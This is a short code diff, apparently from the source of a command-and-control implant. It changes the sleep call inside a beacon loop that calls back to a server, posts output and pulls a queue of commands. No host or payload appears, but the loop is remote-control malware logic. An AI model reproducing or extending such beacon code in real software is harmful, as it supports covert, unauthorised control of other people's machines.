@@ -14,7 +14,7 @@
     // Beacon loop
     while (true) {
         // Sleep
-        WaitForSingleObject(NULL, SLEEP);
+        Sleep(SLEEP);
 
         // Callback to server; post output and get queue
         cmd_queue = cb_full.do_callback();
